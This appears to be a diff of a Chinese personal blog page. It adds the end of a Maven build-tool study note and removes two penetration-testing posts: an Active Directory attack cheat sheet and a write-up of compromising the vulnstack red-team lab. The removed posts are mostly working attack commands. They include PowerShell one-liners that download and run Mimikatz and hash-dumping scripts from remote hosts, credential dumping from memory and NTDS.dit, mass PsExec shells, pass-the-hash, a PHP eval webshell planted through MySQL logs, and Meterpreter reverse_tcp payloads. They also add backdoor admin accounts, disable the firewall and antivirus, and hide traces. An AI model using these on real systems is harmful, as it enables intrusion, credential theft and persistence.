+<li><strong>site</strong>：项目站点文档创建的处理</li>
+</ul>
+<h3 id="典型的生命构建周期"><a href="#典型的生命构建周期" class="headerlink" title="典型的生命构建周期"></a>典型的生命构建周期</h3><table>
+<thead>
+<tr>
+<th align="left">阶段</th>
+<th align="left">处理</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">验证 validate</td>
+<td align="left">验证项目</td>
+<td align="left">验证项目是否正确且所有必须信息是可用的</td>
+</tr>
+<tr>
+<td align="left">编译 compile</td>
+<td align="left">执行编译</td>
+<td align="left">源代码编译在此阶段完成</td>
+</tr>
+<tr>
+<td align="left">测试 Test</td>
+<td align="left">测试</td>
+<td align="left">使用适当的单元测试框架（例如JUnit）运行测试。</td>
+</tr>
+<tr>
+<td align="left">包装 package</td>
+<td align="left">打包</td>
+<td align="left">创建JAR/WAR包如在 pom.xml 中定义提及的包</td>
+</tr>
+<tr>
+<td align="left">检查 verify</td>
+<td align="left">检查</td>
+<td align="left">对集成测试的结果进行检查，以保证质量达标</td>
+</tr>
+<tr>
+<td align="left">安装 install</td>
+<td align="left">安装</td>
+<td align="left">安装打包的项目到本地仓库，以供其他项目使用</td>
+</tr>
+<tr>
+<td align="left">部署 deploy</td>
+<td align="left">部署</td>
+<td align="left">拷贝最终的工程包到远程仓库中，以共享给其他开发人员和工程</td>
+</tr>
+</tbody></table>
+<p>如果执行package，那么clean,test等都会被执行</p>
+<h3 id="构建阶段由插件目标构成"><a href="#构建阶段由插件目标构成" class="headerlink" title="构建阶段由插件目标构成"></a>构建阶段由插件目标构成</h3><p> 一个插件目标代表一个特定的任务（比构建阶段更为精细），这有助于项目的构建和管理。这些目标可能被绑定到多个阶段或者无绑定。不绑定到任何构建阶段的目标可以在构建生命周期之外通过直接调用执行。这些目标的执行顺序取决于调用目标和构建阶段的顺序。 </p>
+<p>插件目标解释： 一个插件有多个目标，每个功能就是一个<em>插件目标</em>，所以一个插件有多个功能。 </p>
+<h2 id="maven-常用命令"><a href="#maven-常用命令" class="headerlink" title="maven 常用命令"></a>maven 常用命令</h2><pre><code class="shell">mvn -v
+mvn compile 编译
+mvn test 测试
+mvn package 打包项目生成jar文件
+mvn clearn 删除target 目录
+mvn install 安装jar包到本地仓库
+创建目录的两种方式
+1. 交互式
+mvn archetype:generate 
+2. 非交互式
+mvn archetype:generate -DgroupId=com.companyname.bank -DartifactId=consumerBanking -DarchetypeArtifactId=maven-archetype-quickstart -DinteractiveMode=false</code></pre>
+<h2 id="在某个阶段使用插件"><a href="#在某个阶段使用插件" class="headerlink" title="在某个阶段使用插件"></a>在某个阶段使用插件</h2><p> <a href="http://maven.apache.org/plugins" target="_blank" rel="noopener">http://maven.apache.org/plugins</a> </p>
+<p>各个插件下有个example config如： <a href="http://maven.apache.org/plugins/maven-source-plugin/" target="_blank" rel="noopener">http://maven.apache.org/plugins/maven-source-plugin/</a> </p>
+<p>在pom.xml文件中project下添加</p>
+<pre><code class="xml">&lt;build&gt;
+    &lt;plugins&gt;
+      &lt;plugin&gt;
+        &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;
+        &lt;artifactId&gt;maven-source-plugin&lt;/artifactId&gt;
+        &lt;version&gt;3.2.0&lt;/version&gt;
+        &lt;!--  &lt;configuration&gt;
+          &lt;outputDirectory&gt;/absolute/path/to/the/output/directory&lt;/outputDirectory&gt;
+          &lt;finalName&gt;filename-of-generated-jar-file&lt;/finalName&gt;
+          &lt;attach&gt;false&lt;/attach&gt;
+        &lt;/configuration&gt;--&gt;
+        &lt;executions&gt;
+            &lt;execution&gt;
+                &lt;phase&gt;package&lt;/phase&gt;
+                &lt;goals&gt;
+                &lt;goal&gt;jar-no-fork&lt;/goal&gt;
+                &lt;!-- 在package阶段执行source:jar-no-fork --&gt;
+            &lt;/goals&gt;
+            &lt;/execution&gt;
+
+        &lt;/executions&gt;
+      &lt;/plugin&gt;
+    &lt;/plugins&gt;
+  &lt;/build&gt;</code></pre>
+<h2 id="maven配置文件"><a href="#maven配置文件" class="headerlink" title="maven配置文件"></a>maven配置文件</h2><h3 id="添加镜像仓库"><a href="#添加镜像仓库" class="headerlink" title="添加镜像仓库"></a>添加镜像仓库</h3><p>在mirrors下添加</p>
+<pre><code class="xml">&lt;mirror&gt;
+        &lt;id&gt;alimaven&lt;/id&gt;
+        &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;&lt;!-- 哪个仓库的镜像，利用*来匹配所有仓库 --&gt;
+        &lt;name&gt;aliyun maven&lt;/name&gt;
+        &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt;
+    &lt;/mirror&gt;
+    &lt;mirror&gt;
+        &lt;id&gt;jcenter&lt;/id&gt;
+        &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;
+        &lt;name&gt;jcenter.bintray.com&lt;/name&gt;
+        &lt;url&gt;http://jcenter.bintray.com/&lt;/url&gt;
+    &lt;/mirror&gt;
+
+    &lt;mirror&gt;
+        &lt;id&gt;repo1&lt;/id&gt;
+        &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;
+        &lt;name&gt;Human Readable Name for this Mirror.&lt;/name&gt;
+        &lt;url&gt;http://repo1.maven.org/maven2/&lt;/url&gt;
+    &lt;/mirror&gt;
+    &lt;mirror&gt;
+        &lt;id&gt;repo2&lt;/id&gt;
+        &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;
+        &lt;name&gt;Human Readable Name for this Mirror.&lt;/name&gt;
+        &lt;url&gt;http://repo2.maven.org/maven2/&lt;/url&gt;
+    &lt;/mirror&gt;</code></pre>
+<h3 id="修改本地仓库地址"><a href="#修改本地仓库地址" class="headerlink" title="修改本地仓库地址"></a>修改本地仓库地址</h3><p>修改<code>&lt;localRepository&gt;E:/apache-maven-3.6.3/repository&lt;/localRepository&gt;</code></p>
+<h2 id="常用插件介绍"><a href="#常用插件介绍" class="headerlink" title="常用插件介绍"></a>常用插件介绍</h2><p> jetty : servlet 本地测试插件</p>
+<p> <a href="http://tomcat.apache.org/maven-plugin.html" target="_blank" rel="noopener">tomcat</a>  :  tomcat  本地测试插件</p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/maven学习笔记/">https://www.ccreater.top/1970/01/01/maven学习笔记/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/02/17/%E9%81%BF%E5%85%8Drm-rf-%E7%9A%84%E6%82%B2%E6%83%A8%E5%91%BD%E8%BF%90/" data-id="ckmn4mn3x007ug4ni8mo8ftnm" data-title="避免rm -rf *的悲惨命运" class="article-share-link">Share</a>
+      <a data-url="https://www.ccreater.top/1970/01/01/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="ckmn575790069s1nihkex583y" data-title="maven学习笔记" class="article-share-link">Share</a>
       
 	  
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-
-  
-    <article id="post-域渗透" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/02/17/%E5%9F%9F%E6%B8%97%E9%80%8F/" class="article-date">
-  <time class="dt-published" datetime="2020-02-17T04:33:47.825Z" itemprop="datePublished">2020-02-17</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/02/17/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="域渗透学习笔记"><a href="#域渗透学习笔记" class="headerlink" title="域渗透学习笔记"></a>域渗透学习笔记</h1><h2 id="名词-缩写"><a href="#名词-缩写" class="headerlink" title="名词/缩写"></a>名词/缩写</h2><p> 活动目录（Active Directory），AD：活动目录是WindowsServer在网络环境中提供的“资源目录”。活动目录是储存着域中相关资源信息的目录，例如计算机，用户组，数据库，服务器，打印机，用户属性（权限等），就像一个数据库。<br>域控（Domain Controller），DC：安装了AD的服务器就是域控制器，即有AD的计算机就是DC。 </p>
-<h2 id="什么是域"><a href="#什么是域" class="headerlink" title="什么是域"></a>什么是域</h2><p> 将网络中多台计算机逻辑上组织到一起，进行集中管理，这种区别于工作组的逻辑环境叫做域，域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器，域控制器中保存着整个域的用户帐号和安全数据库。 </p>
-<h2 id="域的特点"><a href="#域的特点" class="headerlink" title="域的特点"></a>域的特点</h2><p> 域成员计算机在登录的时候可以选择登录到域中或此计算机，登陆到域中的时候，身份验证是采用Kerberos协议在域控制器上进行的，登陆到此计算机则是通过SAM来进行NTLM验证的</p>
-<p> 默认情况下，域用户可以登录到域中所有的工作站，不包括域控制器，管理员也可以指定具体的计算机，域用户信息保存在活动目录中</p>
-<h2 id="一些其他关于域的知识"><a href="#一些其他关于域的知识" class="headerlink" title="一些其他关于域的知识"></a>一些其他关于域的知识</h2><h3 id="DNS定位域控制器"><a href="#DNS定位域控制器" class="headerlink" title="DNS定位域控制器"></a>DNS定位域控制器</h3><p>DNS负责将域名解析成IP地址</p>
-<p>内网的DNS则可以定位DC，域会有名称，比如domaintest。域会向DNS注册这个名称，即SRV记录。域中的计算机访问SRV来进而访问DC。</p>
-<p>通常DNS和DC会安装在同一计算机上，因而此计算的本地连接DNS要指向自身。</p>
-<h2 id="域渗透思路"><a href="#域渗透思路" class="headerlink" title="域渗透思路"></a>域渗透思路</h2><p> 通过域成员主机，定位出域控制器IP及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机IP，设法从<strong>域成员主机内存中</strong>dump出域管理员密码，进而拿下域控制器、渗透整个内网。 </p>
-<h2 id="域渗透常用命令"><a href="#域渗透常用命令" class="headerlink" title="域渗透常用命令"></a>域渗透常用命令</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><pre><code>dsquery server #得到域控制器的IP</code></pre><p><img src="http://www.xmrseo.com/content/uploadfile/201805/dad51527168524.jpg" alt="image886"></p>
-<p><code>net group &quot;domain controllers&quot; /domain</code>: 得到域控制器主机名 </p>
-<p> 注意通过该指令得到的机器名后面会多一个$符号</p>
-<p><code>net group &quot;domain admins&quot; /domain</code>  : 查询域管理用户 </p>
-<p><code>net user /domain</code>查看所有域用户</p>
-<p><code>net config workstation</code> : 查询当前登陆域 </p>
-<p><code>net accounts /domain</code>:  查询域密码策略 </p>
-<p><code>wmic qfe</code> : 查看补丁信息 </p>
-<p><code>wmic os</code>:  查看操作系统类型 </p>
-<p><code>ipconfig /all</code>查询本机IP段，所在域等</p>
-<p><code>tasklist /S ip /U domain\username /P /V</code>查看远程计算机进程列表</p>
-<p> 有一个特殊用户叫做krbtgt，该用户是用于Kerberos身份验证的帐户，获得了该用户的hash，就可以伪造票据进行票据传递攻击了 </p>
-<h4 id="批量查找-域管理员登陆过目标计算机"><a href="#批量查找-域管理员登陆过目标计算机" class="headerlink" title="批量查找 域管理员登陆过目标计算机"></a>批量查找 域管理员登陆过目标计算机</h4><pre><code class="bat">@echo off
-echo check ip addr config file...
-if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto end
-echo read and analysis file...
-for /F &quot;eol=#&quot; %%i in (ip.txt) do echo %%i &amp;(echo %%i &amp;tasklist /s %%i /u administrator /p mytest2010 /v) &gt;&gt;d:\result.txt
-:end
-exit</code></pre>
-<h4 id="批量反弹cmdshell"><a href="#批量反弹cmdshell" class="headerlink" title="批量反弹cmdshell"></a>批量反弹cmdshell</h4><pre><code class="cmd">@echo off
-echo check ip addr config file...
-if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto end
-echo read and analysis file...
-for /F &quot;eol=#&quot; %%i in (ip.txt) do start PsExec.exe \\%%i -accepteula -u administrator -p &quot;123456&quot; cmd &amp; start cmd /c PsExec.exe \\%%i -u administrator -p &quot;123456&quot; cmd
-:end
-exit</code></pre>
-<h3 id="访问内网其他主机"><a href="#访问内网其他主机" class="headerlink" title="访问内网其他主机"></a>访问内网其他主机</h3><p> net use建立Ipc$连接、wmic指令连接、采用rdp方式连接 , psexec进行远程连接 </p>
-<p><img src="http://www.xmrseo.com/content/uploadfile/201805/dad51527169390.jpg" alt="image2183"></p>
-<p><code>net use \\ip\ipc$ pawword /user:username</code>建立IPC会话</p>
-<h3 id="抓取内存中的hash-密码"><a href="#抓取内存中的hash-密码" class="headerlink" title="抓取内存中的hash/密码"></a>抓取内存中的hash/密码</h3><p>抓明文</p>
-<pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz -DumpCerts</code></pre><h4 id="普通hash"><a href="#普通hash" class="headerlink" title="普通hash"></a>普通hash</h4><p>抓hash</p>
-<pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&#39;);Get-PassHashes</code></pre><p>抓取明文:<code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit</code></p>
-<p>抓取hash:<code>mimikatz log &quot;privilege::debug&quot; &quot;lsadump::lsa /patch&quot; exit</code></p>
-<p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:god.org /all /csv&quot; exit</code></p>
-<h4 id="域hash"><a href="#域hash" class="headerlink" title="域hash"></a>域hash</h4><p>NTDS.dit获取域控hash</p>
-<p>这个思路在域渗透中尤为重要，因为这里面包含着所有域用户的hash，当然该思路只对DC生效。</p>
-<p>手动导出NTDS.dit和System-hive，本地或目标机导hash，因为，如果域足够大，该文件也会特别大。</p>
-<p><code>ntdsutil &quot;ac i ntds&quot; ifm &quot;create full c:\users\tmp&quot; q q</code></p>
-<p><code>NTDSDumpEx -d ntds.dit -s system -o domain.txt</code>:注意-d 为ntds.dit路径,-s为system(导出的)路径</p>
-<p><img src="https://image.3001.net/images/20191022/1571757314_5daf1d0242611.png!small" alt="image3247"></p>
-<pre><code>python secretsdump.py -system SYSTEM -ntds ntds.dit local
-python secretsdump.py rabbitmask:1q2w3e4r!@192.168.15.181
-</code></pre><p><img src="https://image.3001.net/images/20191022/1571757406_5daf1d5ee8ee7.png!small" alt="image3460"></p>
-<p><img src="https://image.3001.net/images/20191022/1571757426_5daf1d72d86f0.png!small" alt="image3545"></p>
-<h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><pre><code>net user ccreater Abc1234 /add
-net localgroup administrators ccreater /add
-REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
-</code></pre><h3 id="域控提取域用户hash"><a href="#域控提取域用户hash" class="headerlink" title="域控提取域用户hash"></a>域控提取域用户hash</h3><h4 id="Ntdsutil"><a href="#Ntdsutil" class="headerlink" title="Ntdsutil"></a>Ntdsutil</h4><p> ntdsutil.exe是域控制器自带的域数据库管理工具，从windows 2008就默认自带了 </p>
-<pre><code>Ntdsutil 
-    snapshot—activate instance ntds
-    create
-    mount {guid}
-copy 装载点\windows\NTDS\ntds.dit d:\ntds_save.dit</code></pre><p><img src="http://www.xmrseo.com/content/uploadfile/201805/dad51527169954.jpg" alt="image4044"></p>
-<p><img src="http://www.xmrseo.com/content/uploadfile/201805/dad51527170055.jpg" alt="image4122"></p>
-<p> 最后执行 </p>
-<pre><code>unmount {guid}
-delete {guid}
-quit</code></pre><p> 删除装载点即可，避免被发现 </p>
-<p>接着上传工具QuarksPwDump到域控制器上，然后执行如下命令，成功提取用户hash</p>
-<p><code>QuarksPwDump --dump-hash-domain --ntds-file d:\ntds_save.dit</code></p>
-<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p><code>mimikatz log &quot;privilege::debug&quot; &quot;lsadump::lsa /patch&quot;</code></p>
-<h3 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><pre><code>netsh advfirewall set allprofiles state off#关闭防火墙
-net stop windefend
-netsh firewall set opmode mode=disable
-bcdedit.exe /set{current} nx AlwaysOff#关闭DEP
-meterpreter &gt; run killav  关闭杀毒软件 </code></pre><h2 id="票据传递攻击"><a href="#票据传递攻击" class="headerlink" title="票据传递攻击"></a>票据传递攻击</h2><p> 域中每个用户的Ticket都是由krbtgt的密码Hash来计算生成的，因此只要我们拿到了krbtgt的密码Hash，就可以随意伪造Ticket，进而使用Ticket登陆域控制器，使用krbtgt用户hash生成的票据被称为Golden Ticket，此类攻击方法被称为票据传递攻击。 </p>
-<h2 id="MS14-068-pth"><a href="#MS14-068-pth" class="headerlink" title="MS14-068/pth"></a>MS14-068/pth</h2><p> 微软给出的补丁是kb3011780，在server 2000以上的域控中，如果没有打这个补丁，那么情况将比较糟糕，利用该漏洞可以将任何一个域用户提权至域管理员权限，危害极大。 </p>
-<h3 id="msf-psexec"><a href="#msf-psexec" class="headerlink" title="msf-psexec"></a>msf-psexec</h3><p>目标:192.168.52.138</p>
-<pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8:::</code></pre><pre><code>use exploit/windows/smb/psexec
-set lhost xxx
-set lport xxx
-set rhosts 192.168.52.138
-set smbuser Administrator
-set smbpass aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8</code></pre><h3 id="impacket-smbexec"><a href="#impacket-smbexec" class="headerlink" title="impacket_smbexec"></a>impacket_smbexec</h3><pre><code>python smbexec.py -hash aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8Administrator@192.168.52.138
-
-or
-
-python smbexec.py -hashes :a45a7246dd74b64a67f22fd7020f1bd8 Administrator@192.168.52.138
-</code></pre><p>显然，其实它只需要NThash部分就好啦。</p>
-<h2 id="copy-于"><a href="#copy-于" class="headerlink" title="copy 于"></a>copy 于</h2><p> <a href="http://www.xmrseo.com/?post=87" target="_blank" rel="noopener">http://www.xmrseo.com/?post=87</a> </p>
-<p> <a href="https://zhengbao.wang/域渗透基础/" target="_blank" rel="noopener">https://zhengbao.wang/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/</a> </p>
-<p> <a href="https://www.freebuf.com/articles/system/217681.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/217681.html</a> </p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/17/域渗透/">http://blog.ccreater.top/2020/02/17/域渗透/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/02/17/%E5%9F%9F%E6%B8%97%E9%80%8F/" data-id="ckmn4mn3p0071g4nihu4i1h5y" data-title="域渗透" class="article-share-link">Share</a>
-      
-	  
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-
-  
-    <article id="post-vulnstackATT&amp;CK红队评估靶场1渗透记录" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/02/17/vulnstackATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E9%9D%B6%E5%9C%BA1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" class="article-date">
-  <time class="dt-published" datetime="2020-02-17T04:32:09.142Z" itemprop="datePublished">2020-02-17</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/02/17/vulnstackATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E9%9D%B6%E5%9C%BA1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/">vulnstackATT&amp;CK红队评估靶场1渗透记录</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="vulnstackATT-amp-CK红队评估靶场1渗透记录"><a href="#vulnstackATT-amp-CK红队评估靶场1渗透记录" class="headerlink" title="vulnstackATT&amp;CK红队评估靶场1渗透记录"></a>vulnstackATT&amp;CK红队评估靶场1渗透记录</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>已知靶机在192.168.2.*上</p>
-<pre><code>
-[*] Nmap: Nmap scan report for stu1.lan (192.168.2.142)
-[*] Nmap: Nmap scan report for kali.lan (192.168.2.158)</code></pre><p>目标就是192.168.2.142</p>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre><code>[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 10:48 CST
-[*] Nmap: Stats: 0:03:23 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
-[*] Nmap: SYN Stealth Scan Timing: About 54.92% done; ETC: 10:54 (0:02:47 remaining)
-[*] Nmap: Stats: 0:03:23 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
-[*] Nmap: SYN Stealth Scan Timing: About 54.97% done; ETC: 10:54 (0:02:47 remaining)
-[*] Nmap: Stats: 0:04:40 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
-[*] Nmap: SYN Stealth Scan Timing: About 75.24% done; ETC: 10:54 (0:01:32 remaining)
-[*] Nmap: Nmap scan report for stu1.lan (192.168.2.142)
-[*] Nmap: Host is up (0.00062s latency).
-[*] Nmap: Not shown: 65523 closed ports
-[*] Nmap: PORT     STATE SERVICE
-[*] Nmap: 80/tcp   open  http
-[*] Nmap: 135/tcp  open  msrpc
-[*] Nmap: 139/tcp  open  netbios-ssn
-[*] Nmap: 445/tcp  open  microsoft-ds
-[*] Nmap: 1025/tcp open  NFS-or-IIS
-[*] Nmap: 1026/tcp open  LSA-or-nterm
-[*] Nmap: 1027/tcp open  IIS
-[*] Nmap: 1028/tcp open  unknown
-[*] Nmap: 1029/tcp open  ms-lsa
-[*] Nmap: 1030/tcp open  iad1
-[*] Nmap: 3306/tcp open  mysql
-[*] Nmap: 3389/tcp open  ms-wbt-server
-[*] Nmap: MAC Address: 00:0C:29:A7:C1:B2 (VMware)
-</code></pre><h2 id="web服务"><a href="#web服务" class="headerlink" title="web服务"></a>web服务</h2><p>先去看看web服务吧</p>
-<pre><code>[10:52:41] 200 -   11B  - /index.php
-[10:52:45] 200 -   71KB - /phpinfo.php
-[10:52:45] 200 -    4KB - /phpMyAdmin/
-[10:52:53] 200 -    2B  - /1.php</code></pre><p>看了一下只有phpmyadmin有用</p>
-<p>试着弱密码登陆,不直接用mysql客户端登陆是因为怕他们禁止远程ip</p>
-<p>网上随便找了一个爆破phpmyadmin的</p>
-<p><img src="https://i.loli.net/2020/02/16/vIQt8APEoGW7aKT.png" alt="image1782"></p>
-<p>弱密码登陆成功</p>
-<p>尝试sql写shell</p>
-<pre><code>1. select &quot;test&quot; into outfile &quot;C:/phpStudy/WWW/test.php&quot;;
-2. 日志写shell
-mysql&gt; show variables like &#39;%general%&#39;#先看下当前mysql默认的日志位置在什么地方,&#39;C:\phpStudy\MySQL\data\stu1.log&#39; 顺手把原来正常的日志路径稍微记录下,等会儿干完活儿再把它恢复回来
-mysql&gt; set global general_log = on#默认基本都是关闭的,不然这个增删改查的记录量可能会非常大
-mysql&gt;  set global general_log_file = &#39;C:/phpStudy/WWW/test.php&#39;;#此时,再把原本的日志文件位置指向到目标网站的物理路径
-mysql&gt; select &#39;&lt;?php eval($_POST[request]);?&gt;&#39;#开始写shell,这里就是个普通的shell,不免杀,如果有waf的话,可以用下面的免杀shell
-
-
-##写完之后记得恢复
-mysql&gt; set global general_log_file = &#39;C:\phpStudy\MySQL\data\stu1.log&#39;;
-mysql&gt; set global general_log = off;</code></pre><p><img src="https://i.loli.net/2020/02/16/fUuoVKeY1BMhNXm.png" alt="image2457"></p>
-<p>成功写入shell</p>
-<p><img src="https://i.loli.net/2020/02/16/TKF1n7r5Am2cfBj.png" alt="image2535"></p>
-<p>直接拿到管理员权限了</p>
-<h2 id="meterpreter后攻击"><a href="#meterpreter后攻击" class="headerlink" title="meterpreter后攻击"></a>meterpreter后攻击</h2><pre><code>netsh advfirewall set allprofiles state off#关闭防火墙
-net stop windefend
-netsh firewall set opmode mode=disable
-bcdedit.exe /set{current} nx AlwaysOff#关闭DEP
-meterpreter &gt; run killav  关闭杀毒软件 </code></pre><h2 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h2><pre><code>msfvenom -p php/meterpreter/reverse_tcp -a php -f raw &gt; /tmp/2.php
-use exploit/multi/handler
-set payload php/meterpreter/reverse_tcp
-show options
-run autoroute -s 192.168.52.143
-msf &gt; use auxiliary/server/socks4a   设置socks4代理模块
-msf auxiliary(socks4a) &gt; show options 
-msf auxiliary(socks4a) &gt; run
-vim /etc/proxychains.conf   修改代理监听端口,和前面端口一致
-</code></pre><p>用msf设置的代理不知道为啥不太稳定</p>
-<p>于是我用reGeorg来设置代理</p>
-<p>emmmm,还是ew好用</p>
-<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>因为socks无法代理icmp协议(ping使用的),所以namp要用<code>-Pn</code>选项</p>
-<pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 13:50 ?D1��������?����??
-Nmap scan report for 192.168.52.138
-Host is up (0.00s latency).
-MAC Address: 00:0C:29:3F:5D:A9 (VMware)
-Nmap scan report for 192.168.52.141
-Host is up (0.00s latency).
-MAC Address: 00:0C:29:6D:39:34 (VMware)
-Nmap scan report for www.qiyuanxuetang.net (192.168.52.143)
-Host is up.
-Nmap done: 256 IP addresses (3 hosts up) scanned in 5.01 seconds
-</code></pre><p>接下来的目标是<code>192.168.52.138</code>,<code>192.168.52.141</code></p>
-<p>192.168.52.138</p>
-<pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 13:57 ?D1��������?����??
-Nmap scan report for 192.168.52.138
-Host is up (0.00031s latency).
-Not shown: 983 filtered ports
-PORT      STATE SERVICE
-53/tcp    open  domain
-80/tcp    open  http
-88/tcp    open  kerberos-sec
-135/tcp   open  msrpc
-139/tcp   open  netbios-ssn
-389/tcp   open  ldap
-445/tcp   open  microsoft-ds
-464/tcp   open  kpasswd5
-593/tcp   open  http-rpc-epmap
-636/tcp   open  ldapssl
-3268/tcp  open  globalcatLDAP
-3269/tcp  open  globalcatLDAPssl
-MAC Address: 00:0C:29:3F:5D:A9 (VMware)
-
-Nmap done: 1 IP address (1 host up) scanned in 5.04 seconds</code></pre><p>Running: Microsoft Windows 7|8|Vista|2008</p>
-<p>192.168.52.141</p>
-<pre><code>21/tcp   open  ftp
-135/tcp  open  msrpc
-139/tcp  open  netbios-ssn
-445/tcp  open  microsoft-ds
-777/tcp  open  multiling-http
-1025/tcp open  NFS-or-IIS
-1026/tcp open  LSA-or-nterm
-1030/tcp open  iad1
-1031/tcp open  iad2
-6002/tcp open  X11:2
-7001/tcp open  afs3-callback
-7002/tcp open  afs3-prserver
-8099/tcp open  unknown</code></pre><p>Running: Microsoft Windows XP|2003</p>
-<p>弱密码登陆ftp,发现啥也弄不了动不动500</p>
-<p>因为操作系统比较旧,可以试试MS17-010,成功!</p>
-<p>但是只有ms17_010_command才利用成功,只能一次一次set command来执行命令</p>
-<p>后来找到<code>cmd/windows/powershell_bind_tcp</code></p>
-<p>能直接返回一个powershell</p>
-<p>添加用户</p>
-<pre><code>net user ccreater Abc1234 /add
-net localgroup administrators ccreater /add
-REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></pre><h2 id="域控"><a href="#域控" class="headerlink" title="域控"></a>域控</h2><pre><code>net group &quot;domain controllers&quot; /domain 
-得到域控制器主机名:OWA
-wmic qfe 
-查询安装补丁
-http://support.microsoft.com/?kbid=976902  OWA     Update                    KB976902               GOD\Administrator  11/21/2010 
-
-net user /domain
-查询域所有用户
--------------------------------------------------------------------------------
-Administrator            gqy                      Guest                    
-krbtgt                   ligang                   liukaifeng01   
-</code></pre><p>没有安装kb3011780,可以将任何一个域用户提权至域管理员权限</p>
-<p>域控的ip是:<code>192.168.52.138</code></p>
-<pre><code>Authentication Id : 0 ; 996 (00000000:000003e4)
